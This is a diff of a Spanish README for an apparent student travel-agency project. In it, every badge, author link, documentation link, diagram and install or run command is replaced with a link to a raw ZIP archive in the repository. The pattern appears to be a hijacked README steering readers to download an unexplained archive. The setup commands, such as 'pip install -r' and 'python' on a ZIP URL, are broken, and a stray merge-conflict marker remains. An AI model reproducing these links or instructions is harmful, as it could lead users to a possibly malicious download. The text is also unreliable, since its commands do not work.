@@ -1,13 +1,13 @@
 # Sistema de Agencia de Viajes
 
-![commits](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip) 
-![last_commit](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip)
+![commits](https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip) 
+![last_commit](https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip)
 
-- ver [badgen](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip) o [shields](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip) para otros tipos de _badges_
+- ver [badgen](https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip) o [shields](https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip) para otros tipos de _badges_
 
 ## Autor
 
-- [@estudiante](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip)
+- [@estudiante](https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip)
 
 ## Descripción del Proyecto
 
@@ -32,12 +32,12 @@ Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos
 
 Revisar la documentación en [`./docs`](./docs)
 
-- [Requerimientos](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip)
-- [SRS: Software Requirements Specification](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip)
+- [Requerimientos](https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip)
+- [SRS: Software Requirements Specification](https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip)
 
 ### Diseño
 
-![Diagrama de Clases](https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip)
+![Diagrama de Clases](https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip)
 
 ### Tárifas
 
@@ -67,7 +67,7 @@ Siga estos pasos para configurar y ejecutar el sistema de reservas hoteleras en 
 
 1. **Clonar el proyecto**
 ```bash
-git clone https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
+git clone https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip
 cd lpa1-taller-requerimientos
 ```
 
@@ -87,19 +87,19 @@ source venv/bin/activate
 
 3. **Instalar dependencias**
 ```bash
-pip install -r https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
+pip install -r https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip
 ```
 
 4. **Inicializar la base de datos**
 ```bash
 # Crear base de datos con datos de ejemplo
-python https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip --with-sample-data
+python https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip --with-sample-data
 ```
 
 5. **Configurar variables de entorno (opcional)**
 ```bash
 # Para configuraciones personalizadas
-set https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
+set https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip
 set SECRET_KEY=tu-clave-secreta-segura
 ```
     
@@ -118,7 +118,7 @@ source venv/bin/activate
 
 2. **Ejecutar la aplicación**
 ```bash
-python https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
+python https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip
 ```
 
 3. **Acceder al sistema**
@@ -140,7 +140,7 @@ TODO: Corregir la explicación de la instalación - Morbi quam lectus, tempus si
 
 1. Clonar el proyecto
 ```bash
-git clone https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
+git clone https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip
 ```
 
 2. Crear y activar entorno virtual
@@ -152,7 +152,7 @@ venv/bin/activate
 
 3. Instalar librerías y dependencias
 ```bash
-pip install -r https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
+pip install -r https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip
 ```
     
 ## Ejecución
@@ -162,7 +162,7 @@ TODO: Corregir la explicación de la ejecución - Maecenas sed lorem at arcu var
 1. Ejecutar el proyecto
 ```bash
 cd lpa1-taller-requerimientos
-python https://raw.githubusercontent.com/axlcraft/lpa1-taller-requerimientos/main/hyposthenia/lpa1-taller-requerimientos.zip
+python https://github.com/axlcraft/lpa1-taller-requerimientos/raw/refs/heads/main/app/routes/lpa_taller_requerimientos_v2.3-alpha.1.zip
 ```
 
 >>>>>>> 6133e37e51d481dc74f658a35f3760b2ca834164
